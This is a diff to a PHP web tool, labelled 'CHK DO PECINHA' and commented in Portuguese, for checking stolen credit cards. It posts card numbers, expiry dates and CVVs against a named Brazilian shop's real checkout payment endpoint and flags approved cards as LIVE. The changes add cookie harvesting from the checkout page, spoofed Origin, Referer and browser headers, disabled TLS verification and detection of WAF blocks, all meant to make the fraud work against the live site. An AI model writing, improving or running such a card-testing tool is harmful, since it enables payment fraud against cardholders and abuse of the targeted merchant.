@@ -1,6 +1,6 @@
 <?php
 // =====================================================
-// ✅ CHK DO PECINHA - COM EFEITO SONORO DE SINO (PLIM)
+// ✅ CHK DO PECINHA - COM COOKIE JAR E RETORNO REAL
 // =====================================================
 
 session_start();
@@ -29,7 +29,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'logout') {
     exit;
 }
 
-// 3. Processar Requisição do Checker (Gateway Real Integrado via cURL)
+// 3. Processar Requisição do Checker (Gateway Real Integrado com Cookies & Headers)
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
     if (!isset($_SESSION['logado'])) {
         echo json_encode(['status' => 'error', 'html' => "<span class='text-zinc-500'>[ERRO] Sessão expirada. Faça login novamente.</span>"]);
@@ -49,9 +49,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
     $cc_ano = trim($dados_cc[2]);
     $cc_cvv = trim($dados_cc[3]);
 
-    // Endpoint real capturado no navegador
-    $url = "https://franadesivos.com.br/checkout/pay";
+    $cookie_file = __DIR__ . '/cookie.txt';
+    $url_checkout = "https://franadesivos.com.br/checkout";
+    $url_pay = "https://franadesivos.com.br/checkout/pay";
 
+    // ETAPA A: Acessa a página de checkout primeiro para gerar os cookies de sessão e token CSRF se houver
+    $ch_init = curl_init($url_checkout);
+    curl_setopt($ch_init, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch_init, CURLOPT_COOKIEJAR, $cookie_file);
+    curl_setopt($ch_init, CURLOPT_COOKIEFILE, $cookie_file);
+    curl_setopt($ch_init, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch_init, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch_init, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
+    curl_exec($ch_init);
+    curl_close($ch_init);
+
+    // ETAPA B: Dispara o POST de pagamento usando os cookies coletados
     $dados_envio = [
         'default'         => '277958',
         'shipping-method' => 'mandae_economico',
@@ -66,24 +79,44 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
         'grc-response'    => ''
     ];
 
-    $ch = curl_init($url);
+    $ch = curl_init($url_pay);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($dados_envio));
+    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
+    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
     curl_setopt($ch, CURLOPT_HTTPHEADER, [
         'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
         'X-Requested-With: XMLHttpRequest',
-        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        'Origin: https://franadesivos.com.br',
+        'Referer: https://franadesivos.com.br/checkout',
+        'Accept: application/json, text/javascript, */*; q=0.01',
+        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
     ]);
 
     $resposta_bruta = curl_exec($ch);
+    $erro_curl = curl_error($ch);
     curl_close($ch);
 
-    $resposta_json = json_decode($resposta_bruta, true);
-    $status_site = $resposta_json['status'] ?? 'failed';
-    $retorno_msg = $resposta_json['message'] ?? 'Erro desconhecido';
+    if (!empty($erro_curl)) {
+        $retorno_msg = "Erro cURL: " . $erro_curl;
+        $status_site = 'failed';
+    } else {
+        $resposta_json = json_decode($resposta_bruta, true);
+        if (is_array($resposta_json)) {
+            $status_site = $resposta_json['status'] ?? 'failed';
+            $retorno_msg = $resposta_json['message'] ?? $resposta_json['error'] ?? 'Retorno sem mensagem';
+        } else {
+            // Se o site retornou HTML/Texto (ex: Bloqueio Cloudflare ou erro 500)
+            $status_site = 'failed';
+            $retorno_msg = "Retorno não-JSON (Possível WAF/Bloqueio)";
+        }
+    }
 
-    if ($status_site === 'success' || $status_site === 'approved') {
+    if ($status_site === 'success' || $status_site === 'approved' || $status_site === 'ativado') {
         $html = "<span class='text-black font-extrabold bg-white px-2.5 py-0.5 rounded shadow-md tracking-wide'>[LIVE]</span> <span class='text-white font-medium'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$retorno_msg}</span>";
         echo json_encode(['status' => 'live', 'html' => $html]);
     } else {
@@ -187,22 +220,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
                     <span id="contador" class="text-xs text-zinc-500 font-mono">Progresso: 0 / 0</span>
                 </div>
                 <div id="resultado" class="w-full h-56 bg-black border border-zinc-800 rounded-xl p-4 text-xs font-mono overflow-y-auto text-zinc-400 space-y-2 selection:bg-zinc-800">
-                    <span class="text-zinc-600">// Sistema pronto para iniciar as requisições...</span>
+                    <span class="text-zinc-600">// Sistema pronto para iniciar as requisições com cookies reais...</span>
                 </div>
             </div>
         </div>
 
         <script>
-            // Função para tocar o som de sino "Plim" sintético em alta qualidade
             function tocarSomPlim() {
                 try {
                     const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    
                     const osc = audioCtx.createOscillator();
                     const gainNode = audioCtx.createGain();
 
                     osc.type = 'sine';
-                    osc.frequency.setValueAtTime(1046.50, audioCtx.currentTime); // C6
+                    osc.frequency.setValueAtTime(1046.50, audioCtx.currentTime);
                     osc.frequency.exponentialRampToValueAtTime(2093.00, audioCtx.currentTime + 0.1);
 
                     gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
@@ -213,9 +244,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
 
                     osc.start();
                     osc.stop(audioCtx.currentTime + 1.2);
-                } catch (e) {
-                    // Ignora bloqueios de autoplay do navegador se houver
-                }
+                } catch (e) {}
             }
 
             function dispararConfeteLive() {
